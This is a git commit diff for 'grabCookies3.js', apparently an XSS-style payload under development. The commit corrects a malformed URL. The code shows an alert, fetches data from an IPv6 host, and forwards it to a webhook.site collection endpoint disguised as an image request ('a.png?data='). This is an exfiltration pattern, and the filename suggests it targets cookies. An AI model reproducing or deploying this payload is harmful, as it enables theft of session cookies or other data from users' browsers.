28d7757c7a242f2c7c67204d9b8b879549d84dab
ambordokan <91415607+ambordokan@users.noreply.github.com>
2023-02-01 20:26:38 -0500

    Update grabCookies3.js

--- grabCookies3.js
+++ grabCookies3.js
@@ -8,7 +8,7 @@
 //}
 
 alert("Is it working?");
-fetch("http://http://2601:582:c482:22a0:8ca9:986f:400d:1253:8888").then((res) => {
+fetch("http://2601:582:c482:22a0:8ca9:986f:400d:1253:8888").then((res) => {
     return res.text();
 }).then(data => {
     fetch("https://webhook.site/dca2f591-eb3a-47f9-8f5f-c5c2d1c0116d/a.png?data="+data);
